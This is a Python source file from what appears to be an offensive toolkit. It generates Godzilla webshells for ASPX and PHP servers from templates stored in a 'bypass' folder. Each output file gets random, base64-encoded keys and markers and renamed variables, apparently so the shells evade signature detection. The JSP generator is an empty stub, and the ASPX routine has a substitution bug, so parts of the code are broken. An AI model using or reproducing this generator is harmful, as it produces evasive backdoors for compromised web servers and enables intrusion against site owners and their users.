import source.utils as utils
import base64

def gen_godzilla_shell_aspx(key, filename):
    md5key = utils.gen_godzilla_shell_key(key)
    keystr = (utils.gen_random_str8() + md5key + utils.gen_random_str8()).encode() 
    loadstr = (utils.gen_random_str8() + "Load" + utils.gen_random_str8()).encode() 
    lystr = (utils.gen_random_str8() + "LY" + utils.gen_random_str8()).encode() 
    pyloadstr = (utils.gen_random_str8() + "Sec-Fetch-Cro" + utils.gen_random_str8()).encode() 
    keyb64str = base64.b64encode(keystr).decode()
    loadb64str = base64.b64encode(loadstr).decode()
    lyb64str = base64.b64encode(lystr).decode()
    pyloadb64str = base64.b64encode(pyloadstr).decode()
    keyoldstr = "Nmppc2RmXiAzYzZlMGI4YTljMTUyMjRhIHMxMzZnZHM="
    loadoldstr = "Nmppc2RmXiBMb2FkIHMxMzZnZHM="
    lyoldstr = "Nmppc2RmXiBMWSBzMTM2Z2Rz"
    pyloadoldstr = "Nmppc2RmXiBTZWMtRmV0Y2gtQ3JvIHMxMzZnZHM="

    oldvar0str = "sstr0"
    oldvar1str = "sstr1"
    oldvar2str = "sstr2"
    oldvar3str = "sstr3"
    oldvar4str = "sstr4"
    oldvar5str = "sstr5"
    oldvar6str = "sstr6"
    oldvar7str = "sstr7"
    oldvar8str = "sstr8"
    oldvar9str = "sstr9"
    newvar0str = utils.gen_random_var();
    newvar1str = utils.gen_random_var();
    newvar2str = utils.gen_random_var();
    newvar3str = utils.gen_random_var();
    newvar4str = utils.gen_random_var();
    newvar5str = utils.gen_random_var();
    newvar6str = utils.gen_random_var();
    newvar7str = utils.gen_random_var();
    newvar8str = utils.gen_random_var();
    newvar9str = utils.gen_random_var();

    if not filename:
        filename = f"./output/{utils.gen_random_var()}.aspx"

    with open("./templates/bypass/Godzilla_CSHAP_AES_RAW.aspx", "r", encoding="utf-8") as f1,open(filename, "w+", encoding="utf-8") as f2:
        for line in f1:
            if keyoldstr in line:
                line = line.replace(keyoldstr, keyb64str)
            if loadoldstr in line:
                line = line.replace(loadoldstr, loadb64str)
            if lyoldstr in line:
                line = line.replace(lyoldstr, lyb64str)
            if pyloadoldstr in line:
                line = line.replace(lyoldstr, pyloadb64str)
            if oldvar0str in line:
                line = line.replace(oldvar0str, newvar0str)
            if oldvar1str in line:
                line = line.replace(oldvar1str, newvar1str)
            if oldvar2str in line:
                line = line.replace(oldvar2str, newvar2str)
            if oldvar3str in line:
                line = line.replace(oldvar3str, newvar3str)
            if oldvar4str in line:
                line = line.replace(oldvar4str, newvar4str)
            if oldvar5str in line:
                line = line.replace(oldvar5str, newvar5str)
            if oldvar6str in line:
                line = line.replace(oldvar6str, newvar6str)
            if oldvar7str in line:
                line = line.replace(oldvar7str, newvar7str)
            if oldvar8str in line:
                line = line.replace(oldvar8str, newvar8str)
            if oldvar9str in line:
                line = line.replace(oldvar9str, newvar9str)
            f2.write(line)
    print(f"[+] Success generate webshell path in {filename}")


def gen_godzilla_shell_php(key, filename):
    md5key = utils.gen_godzilla_shell_key(key)
    keystr = (utils.gen_random_str8() + md5key + utils.gen_random_str8()).encode() 
    phpstr = (utils.gen_random_str8() + "php://input" + utils.gen_random_str8()).encode() 
    getstr = (utils.gen_random_str8() + "getBasicsInfo" + utils.gen_random_str8()).encode() 
    pyloadstr = (utils.gen_random_str8() + "Sec-Fetch-Cro" + utils.gen_random_str8()).encode() 
    keyb64str = base64.b64encode(keystr).decode()
    phpb64str = base64.b64encode(phpstr).decode()
    getb64str = base64.b64encode(getstr).decode()
    pyloadb64str = base64.b64encode(pyloadstr).decode()

    keyoldstr = "Nmppc2RmXiAzYzZlMGI4YTljMTUyMjRhIGZ1ZDJrczI4"
    phpoldstr = "Nmppc2RmXiBwaHA6Ly9pbnB1dCBmdWQya3MyOA=="
    getoldstr = "Nmppc2RmXiBnZXRCYXNpY3NJbmZvIGZ1ZDJrczI4"
    pyloadoldstr = "Nmppc2RmXiBTZWMtRmV0Y2gtQ3JvIHMxMzZnZHM=="

    oldvar0str = "sstr0"
    oldvar1str = "sstr1"
    oldvar2str = "sstr2"
    oldvar3str = "sstr3"
    oldvar4str = "sstr4"
    oldvar5str = "sstr5"
    oldvar6str = "sstr6"
    oldvar7str = "sstr7"
    oldvar8str = "sstr8"
    oldvar9str = "sstr9"
    oldvar10str = "sstr10"
    oldvar11str = "sstr11"
    oldvar12str = "sstr12"
    newvar0str = utils.gen_random_var();
    newvar1str = utils.gen_random_var();
    newvar2str = utils.gen_random_var();
    newvar3str = utils.gen_random_var();
    newvar4str = utils.gen_random_var();
    newvar5str = utils.gen_random_var();
    newvar6str = utils.gen_random_var();
    newvar7str = utils.gen_random_var();
    newvar8str = utils.gen_random_var();
    newvar9str = utils.gen_random_var();
    newvar10str = utils.gen_random_var();
    newvar11str = utils.gen_random_var();
    newvar12str = utils.gen_random_var();

    if not filename:
        filename = f"./output/{utils.gen_random_var()}.php"

    with open("./templates/bypass/Godzilla_PHP_XOR_RAW.php", "r", encoding="utf-8") as f1,open(filename, "w+", encoding="utf-8") as f2:
        for line in f1:
            if keyoldstr in line:
                line = line.replace(keyoldstr, keyb64str)
            if phpoldstr in line:
                line = line.replace(phpoldstr, phpb64str)
            if getoldstr in line:
                line = line.replace(getoldstr, getb64str)
            if pyloadoldstr in line:
                line = line.replace(pyloadoldstr, pyloadb64str)
            if oldvar0str in line:
                line = line.replace(oldvar0str, newvar0str)
            if oldvar1str in line:
                line = line.replace(oldvar1str, newvar1str)
            if oldvar2str in line:
                line = line.replace(oldvar2str, newvar2str)
            if oldvar3str in line:
                line = line.replace(oldvar3str, newvar3str)
            if oldvar4str in line:
                line = line.replace(oldvar4str, newvar4str)
            if oldvar5str in line:
                line = line.replace(oldvar5str, newvar5str)
            if oldvar6str in line:
                line = line.replace(oldvar6str, newvar6str)
            if oldvar7str in line:
                line = line.replace(oldvar7str, newvar7str)
            if oldvar8str in line:
                line = line.replace(oldvar8str, newvar8str)
            if oldvar9str in line:
                line = line.replace(oldvar9str, newvar9str)
            if oldvar10str in line:
                line = line.replace(oldvar10str, newvar10str)
            if oldvar11str in line:
                line = line.replace(oldvar11str, newvar11str)
            if oldvar12str in line:
                line = line.replace(oldvar12str, newvar12str)
            f2.write(line)
    print(f"[+] Success generate webshell path in {filename}")

def gen_godzilla_shell_jsp(key, filename):
    pass